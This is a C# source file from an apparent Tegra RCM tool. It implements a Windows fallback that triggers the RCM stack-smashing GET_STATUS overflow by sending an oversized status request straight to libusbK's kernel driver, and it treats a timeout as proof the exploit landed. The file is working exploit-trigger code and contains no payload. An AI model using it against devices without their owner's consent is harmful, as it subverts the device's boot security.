using System.Runtime.InteropServices;

namespace CsTegraRcmGui.Core.Services;

/// <summary>
/// Windows-only fallback for the RCM stack-smashing GET_STATUS control
/// transfer: submits it directly via libusbK's raw driver IOCTL, bypassing
/// libusb's control-transfer path. libusb's Windows backend hard-caps every
/// control transfer at 4096 bytes (MAX_CTRL_BUFFER_LENGTH in
/// windows_winusb.c) for WinUSB, libusbK and libusb0 alike — that cap lives
/// in libusb-1.0.dll itself, not in the driver, so rebinding the device to
/// a different driver via Zadig cannot avoid it. This mirrors the approach
/// rajkosto/TegraRcmSmash uses on Windows: talk to libusbK's kernel driver
/// directly with LIBUSB_IOCTL_GET_STATUS, which has no such limit.
///
/// The device's raw file path is looked up via libusbK.dll's own device
/// list API (LstK_*) rather than hand-rolled SetupDi/registry lookups:
/// Zadig assigns each device a random, install-time-generated interface
/// GUID with no fixed value to search for, so libusbK.dll — installed
/// system-wide alongside the driver itself — is the one thing that already
/// knows how to resolve it correctly.
/// </summary>
internal static class WindowsRcmTrigger
{
    private const uint IoctlGetStatus = 0x22201C; // CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
    private const uint RecipientEndpoint = 0x02;
    private const uint RequestTimeoutMs = 3000;
    private const int ErrorSemTimeout = 121;

    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint FileShareReadWrite = 0x01 | 0x02;
    private const uint OpenExisting = 3;

    // Offsets into KLST_DEVINFO (lusbk_shared.h / libusbk.h), which has no
    // explicit packing and so uses natural 4-byte alignment throughout —
    // every field before DevicePath is either an INT or a 256-byte CHAR
    // array, so all offsets land on 4-byte boundaries with no padding.
    private const int DevInfoVidOffset = 0;
    private const int DevInfoPidOffset = 4;
    private const int DevInfoDevicePathOffset = 2064;

    /// <summary>
    /// Returns true only when the request was submitted and timed out
    /// waiting for a response — the signal that the overflow landed and the
    /// device jumped away. Any other outcome (couldn't find/open the raw
    /// device node, the ioctl failed some other way, or the device
    /// responded normally) means the trigger did not land.
    /// </summary>
    public static bool Trigger(int vendorId, int productId, int triggerLength, ILogger log)
    {
        var devicePath = FindDevicePath(vendorId, productId, log);
        if (devicePath is null)
            return false;

        var handle = CreateFile(devicePath, GenericRead | GenericWrite, FileShareReadWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
        if (handle == new IntPtr(-1))
        {
            log.Debug($"Trigger (Windows raw IOCTL): failed to open '{devicePath}' (Win32 error {Marshal.GetLastWin32Error()})");
            return false;
        }

        try
        {
            // libusbk::libusb_request, "status" union member: timeout@0,
            // recipient@4, index@8, status@12 (unused, left zero).
            var request = new byte[24];
            BitConverter.GetBytes(RequestTimeoutMs).CopyTo(request, 0);
            BitConverter.GetBytes(RecipientEndpoint).CopyTo(request, 4);

            var response = new byte[triggerLength];

            log.Debug($"Trigger (Windows raw IOCTL): submitting, length={triggerLength}");
            if (DeviceIoControl(handle, IoctlGetStatus, request, request.Length, response, response.Length, out var bytesReturned, IntPtr.Zero))
            {
                log.Debug($"Trigger (Windows raw IOCTL): device responded before jumping away (trigger did not land): {bytesReturned} bytes");
                return false;
            }

            var error = Marshal.GetLastWin32Error();
            if (error == ErrorSemTimeout)
            {
                log.Debug("Trigger (Windows raw IOCTL): request timed out waiting for a response (expected once the trigger lands)");
                return true;
            }

            log.Debug($"Trigger (Windows raw IOCTL): DeviceIoControl failed unexpectedly (Win32 error {error})");
            return false;
        }
        finally
        {
            CloseHandle(handle);
        }
    }

    private static string? FindDevicePath(int vendorId, int productId, ILogger log)
    {
        if (!LstK_Init(out var deviceList, 0))
        {
            log.Debug($"Trigger (Windows raw IOCTL): LstK_Init failed (Win32 error {Marshal.GetLastWin32Error()}) — is libusbK.dll installed?");
            return null;
        }

        try
        {
            var scanned = 0;
            while (LstK_MoveNext(deviceList, out var devInfo))
            {
                if (devInfo == IntPtr.Zero)
                    continue;

                scanned++;
                var vid = Marshal.ReadInt32(devInfo, DevInfoVidOffset);
                var pid = Marshal.ReadInt32(devInfo, DevInfoPidOffset);
                if (vid != vendorId || pid != productId)
                    continue;

                var devicePath = Marshal.PtrToStringAnsi(devInfo + DevInfoDevicePathOffset);
                log.Debug($"Trigger (Windows raw IOCTL): found matching libusbK device, path '{devicePath}'");
                return devicePath;
            }

            log.Debug($"Trigger (Windows raw IOCTL): scanned {scanned} libusbK device(s), none matched VID={vendorId:X4} PID={productId:X4}");
        }
        finally
        {
            LstK_Free(deviceList);
        }

        return null;
    }

    [DllImport("libusbK.dll", SetLastError = true)]
    private static extern bool LstK_Init(out IntPtr deviceList, int flags);

    [DllImport("libusbK.dll", SetLastError = true)]
    private static extern bool LstK_MoveNext(IntPtr deviceList, out IntPtr deviceInfo);

    [DllImport("libusbK.dll", SetLastError = true)]
    private static extern bool LstK_Free(IntPtr deviceList);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeviceIoControl(IntPtr device, uint ioControlCode, byte[] inBuffer, int inBufferSize, byte[] outBuffer, int outBufferSize, out int bytesReturned, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);
}
